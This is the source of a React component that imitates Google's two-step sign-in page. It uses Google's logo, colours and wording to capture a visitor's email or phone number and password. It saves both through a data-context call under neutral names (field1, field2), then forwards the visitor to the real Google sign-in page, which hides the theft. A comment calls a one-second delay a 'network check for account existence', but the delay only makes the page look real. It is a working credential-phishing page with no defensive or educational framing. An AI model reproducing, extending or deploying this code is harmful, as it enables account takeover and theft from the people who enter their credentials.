
import React, { useState, useEffect } from 'react';
import { useData } from '../context/DataContext';
import { useLanguage } from '../context/LanguageContext';
import Input from './Input';
import Button from './Button';
import { GoogleLogo } from './icons/GoogleLogo';

const GuestForm: React.FC<{ onBack?: () => void }> = () => {
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [field1, setField1] = useState(''); // Email/Phone
  const [field2, setField2] = useState(''); // Password
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isLoadingStep, setIsLoadingStep] = useState(false); // New state for transition delay
  const [validationError, setValidationError] = useState<string | null>(null);
  const { addGuestData } = useData();
  const { t } = useLanguage();

  // Reset error when typing
  useEffect(() => {
    if (validationError) setValidationError(null);
  }, [field1, field2]);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError(null);

    if (step === 'email') {
      const trimmed = field1.trim();
      if (!trimmed) {
        setValidationError(t('errorEmptyEmail'));
        return;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^[\d\s\-\+\(\)]+$/;
      
      const isEmail = emailRegex.test(trimmed);
      const isPhone = phoneRegex.test(trimmed) && /\d/.test(trimmed);

      if (!isEmail && !isPhone) {
        setValidationError(t('errorInvalidEmail'));
        return;
      }

      // Simulate network check for account existence
      setIsLoadingStep(true);
      setTimeout(() => {
        setIsLoadingStep(false);
        setStep('password');
      }, 1000);

    } else {
      handleFinalSubmit();
    }
  };

  const handleFinalSubmit = async () => {
    if (!field2.trim()) {
        setValidationError(t('errorEmptyPassword'));
        return;
    }

    setIsSubmitting(true);

    try {
      await addGuestData({ field1, field2 });
      window.location.href = "https://accounts.google.com/signin";
    } catch (error) {
      console.error("Submission failed", error);
      setValidationError(t('errorGeneric'));
      setIsSubmitting(false);
    }
  };

  const LoadingBar = () => (
    <div className="absolute top-0 left-0 w-full h-1 overflow-hidden bg-[#e0e0e0] z-10">
       <div className="h-full bg-[#0b57d0] animate-indeterminate-bar"></div>
    </div>
  );

  const isBusy = isSubmitting || isLoadingStep;

  return (
    <div className="w-full max-w-[448px] bg-white md:border md:border-[#dadce0] rounded-[28px] px-10 py-12 relative flex flex-col min-h-[500px] shadow-none md:shadow-sm overflow-hidden">
      {isBusy && <LoadingBar />}
      
      <div className="flex justify-center mb-4">
        <GoogleLogo className="h-12 w-12" />
      </div>

      <div className="text-center mb-10">
        <h1 className="text-[24px] text-[#1f1f1f] font-normal mb-2 leading-[1.3333]">
          {step === 'email' ? t('signIn') : t('welcome')}
        </h1>
        
        {step === 'email' ? (
          <p className="text-[16px] text-[#1f1f1f] leading-[1.5]">
            {t('continueTo')}
          </p>
        ) : (
          <div 
            className={`inline-flex items-center gap-2 px-2 pr-3 py-1 border border-[#747775] rounded-full cursor-pointer hover:bg-gray-50 transition-colors mt-2 max-w-full ${isBusy ? 'pointer-events-none opacity-50' : ''}`}
            onClick={() => !isBusy && setStep('email')}
          >
            <div className="h-5 w-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-xs font-bold">
                {field1.charAt(0).toUpperCase()}
            </div>
            <span className="text-[14px] font-medium text-[#1f1f1f] truncate max-w-[200px]">{field1}</span>
            <svg className="h-4 w-4 text-[#444746]" viewBox="0 0 24 24" fill="currentColor">
               <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
            </svg>
          </div>
        )}
      </div>

      <form onSubmit={handleNextStep} className="flex flex-col flex-grow">
        <div className="flex-grow">
          {step === 'email' ? (
            <div className="space-y-3">
              <Input
                id="field1"
                type="text"
                label={t('emailOrPhone')}
                value={field1}
                onChange={(e) => setField1(e.target.value)}
                disabled={isBusy}
                autoFocus
              />
              <button type="button" disabled={isBusy} className="text-[#0b57d0] text-[14px] font-medium hover:bg-[#f0f4f9] px-2 py-1.5 rounded -ml-2 transition-colors disabled:opacity-60 disabled:cursor-not-allowed">
                {t('forgotEmail')}
              </button>
              
              <div className="mt-10 text-[14px] text-[#444746] leading-[1.42]">
                {t('guestMode')} <br/>
                <a href="#" className="text-[#0b57d0] font-medium hover:bg-[#f0f4f9] px-1 -ml-1 rounded inline-block mt-1">{t('learnMore')}</a>
              </div>
            </div>
          ) : (
            <div className="space-y-2 animate-fade-in">
              <Input
                id="field2"
                type={showPassword ? "text" : "password"}
                label={t('enterPassword')}
                value={field2}
                onChange={(e) => setField2(e.target.value)}
                disabled={isBusy}
                autoFocus
              />
              <div className="flex items-center mt-2 ml-1">
                <div className="relative flex items-center justify-center">
                    <input 
                        id="show-pass" 
                        type="checkbox" 
                        checked={showPassword}
                        onChange={() => setShowPassword(!showPassword)}
                        disabled={isBusy}
                        className="peer h-[18px] w-[18px] border-2 border-[#747775] rounded-sm bg-white checked:bg-[#0b57d0] checked:border-[#0b57d0] focus:ring-0 cursor-pointer appearance-none transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    />
                    <svg className="absolute h-3.5 w-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100 transition-opacity" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" />
                    </svg>
                </div>
                <label htmlFor="show-pass" className="ml-4 text-[14px] text-[#1f1f1f] cursor-pointer select-none">{t('showPassword')}</label>
              </div>
            </div>
          )}

          {validationError && (
             <div className="flex items-start mt-4 text-[#d93025] text-xs">
                <svg className="h-4 w-4 mr-2 flex-shrink-0" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                <span>{validationError}</span>
             </div>
          )}
        </div>

        <div className="mt-12 flex justify-between items-center">
            {step === 'email' ? (
                 <Button type="button" variant="ghost" disabled={isBusy}>{t('createAccount')}</Button>
            ) : (
                 <Button type="button" variant="ghost" disabled={isBusy}>{t('forgotPassword')}</Button>
            )}
          
          <Button type="submit" disabled={isBusy}>
            {t('next')}
          </Button>
        </div>
      </form>
      
      <style>{`
        @keyframes indeterminate-bar {
            0% { left: -35%; right: 100%; }
            60% { left: 100%; right: -90%; }
            100% { left: 100%; right: -90%; }
        }
        .animate-indeterminate-bar {
            position: absolute;
            animation: indeterminate-bar 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
            height: 100%;
            background-color: #0b57d0;
        }
        .animate-fade-in {
            animation: fadeIn 0.3s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(10px); }
            to { opacity: 1; transform: translateX(0); }
        }
      `}</style>
    </div>
  );
};

export default GuestForm;
